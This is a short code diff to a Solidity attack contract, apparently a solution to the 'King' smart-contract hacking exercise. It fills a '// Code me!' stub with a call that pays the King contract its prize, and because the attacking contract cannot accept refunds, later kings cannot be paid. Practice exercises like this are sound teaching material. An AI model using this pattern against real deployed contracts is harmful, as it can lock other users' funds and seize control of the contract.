@@ -5,12 +5,16 @@ import "hardhat/console.sol";
 
 contract AttackingKing {
     address public contractAddress;
+    King public kingContract;
 
-    constructor(address _contractAddress) payable {
+    constructor(address payable _contractAddress) payable {
         contractAddress = _contractAddress;
+        kingContract = King(_contractAddress);
     }
 
-    function hackContract() external {
+    function hackContract() external payable{
         // Code me!
+        address(kingContract).call{value: kingContract.prize()}(""); // triggering the receive() function on King contract with the msg.value as prize
+
     }
 }
